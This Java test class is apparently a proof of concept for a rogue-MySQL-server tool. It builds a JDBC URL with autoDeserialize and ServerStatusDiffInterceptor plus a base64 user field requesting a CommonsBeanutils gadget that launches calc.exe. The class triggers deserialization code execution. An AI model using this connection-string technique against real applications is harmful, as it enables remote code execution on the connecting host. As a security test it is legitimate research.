package me.n1ar4.fake.test.mysql6;

import java.sql.DriverManager;

public class MySQL6CB_SBase {
    public static void main(String[] args) {
        String url = "jdbc:mysql://127.0.0.1:3308/test?" +
                "autoDeserialize=true&statementInterceptors=" +
                "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=base64ZGVzZXJfQ0JfY2FsYy5leGU=";
        try {
            Class.forName("com.mysql.jdbc.Driver");
            DriverManager.getConnection(url);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
